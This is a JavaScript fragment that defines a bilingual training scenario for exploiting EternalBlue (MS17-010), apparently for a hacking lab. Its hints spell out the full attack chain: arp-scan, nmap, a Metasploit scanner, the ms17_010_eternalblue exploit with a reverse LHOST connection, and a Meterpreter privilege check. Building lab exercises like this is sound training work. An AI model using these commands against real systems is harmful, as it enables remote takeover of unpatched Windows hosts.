...
export const SCENARIO_TEMPLATES_ETERNAL = {
  eternalBlue: () => ({
    ...
    learningSteps: [
      { task: 'Network Reconnaissance', taskEs: 'Reconocimiento de red', text: 'Discover hosts on the network', textEs: 'Descubrí los hosts en la red', discoveryLevel: 1, hints: { hint1: { en: 'Use arp-scan', es: 'Usá arp-scan' }, hint2: { en: 'arp-scan 172.16.0.0/24', es: 'arp-scan 172.16.0.0/24' } } },
      { task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify the services running on the target', textEs: 'Identificá los servicios que corren en el objetivo', discoveryLevel: 2, hints: { hint1: { en: 'Use nmap', es: 'Usá nmap' }, hint2: { en: 'nmap -sV 172.16.0.11', es: 'nmap -sV 172.16.0.11' } } },
      { task: 'Verify Vulnerability', taskEs: 'Verificar vulnerabilidad', text: 'Check if the target is vulnerable to MS17-010', textEs: 'Verificá si el objetivo es vulnerable a MS17-010', discoveryLevel: 2, hints: { hint1: { en: 'Use Metasploit modules', es: 'Usá módulos de Metasploit' }, hint2: { en: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run', es: 'msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set rhosts 172.16.0.11 → run' } } },
      { task: 'Exploit EternalBlue', taskEs: 'Explotar EternalBlue', text: 'Exploit the MS17-010 vulnerability to gain access', textEs: 'Explotá la vulnerabilidad MS17-010 para obtener acceso', discoveryLevel: 3, hints: { hint1: { en: 'Use the EternalBlue exploit', es: 'Usá el exploit EternalBlue' }, hint2: { en: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit', es: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS 172.16.0.11 → set LHOST 172.16.0.10 → exploit' } } },
      { task: 'Verify SYSTEM Access', taskEs: 'Verificar acceso SYSTEM', text: 'Verify that you have obtained SYSTEM privileges', textEs: 'Verificá que obtuviste privilegios SYSTEM', discoveryLevel: 4, hints: { hint1: { en: 'Check your user id in meterpreter', es: 'Verificá tu ID de usuario en meterpreter' }, hint2: { en: 'getuid', es: 'getuid' } } },
    ],
  }),
};
